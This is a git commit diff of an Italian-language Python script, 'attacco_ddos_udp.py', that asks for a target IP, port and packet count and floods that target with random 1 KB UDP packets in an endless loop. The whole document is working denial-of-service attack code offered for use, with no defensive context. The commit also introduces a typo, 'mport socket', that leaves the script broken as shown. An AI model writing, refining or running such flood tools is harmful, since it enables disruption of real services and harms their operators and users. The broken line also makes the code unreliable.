7d84f77f812b0525ef5651e452013738eb70f6e9
GAXA777 <86745377+GAXA777@users.noreply.github.com>
2023-05-16 18:04:10 +0200

    Update attacco_ddos_udp.py

--- attacco_ddos_udp.py
+++ attacco_ddos_udp.py
@@ -1,34 +1,23 @@
-import socket
+mport socket
 import random
 
-# Richiesta dell'IP e della porta target
-
-ip_target =  input("inserisci qui l'indirizzo ip del bersaglio target\n")
-porta_target = int(input("inserisci qui il numero della porti del bersaglio target\n "))
-
-# Richiesta del numero di kb da inviare
-
-byte_da_inviare =int(input("Inserisci il numero di  kb da inviare\n"))
-
-# Creazione del socket UDP
+ip_target = input("Inserisci l'indirizzo IP del bersaglio target: ")
+porta_target = int(input("Inserisci il numero della porta del bersaglio target: "))
+byte_da_inviare = int(input("Inserisci il numero di KB da inviare: "))
 
 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
-# Calcolo del numero di pacchetti da inviare (1 pacchetto = 1 KB)
-
 conto_byte = byte_da_inviare
-
-# Generazione dei dati casuali per il pacchetto
 
 pacchetto_dati = random.randbytes(1024)
 
-
-# Invio dei pacchetti
 while True:
-	for _ in range(conto_byte):
-	s.sendto(pacchetto_dati, (ip_target, porta_target))
-
+    for _ in range(conto_byte):
+        s.sendto(pacchetto_dati, (ip_target, porta_target))
+        print("Pacchetto inviato a", ip_target, "sulla porta", porta_target)
 
 s.close()
 
-print("attacco andato a buon fine")
+print("Attacco andato a buon fine")
+
+
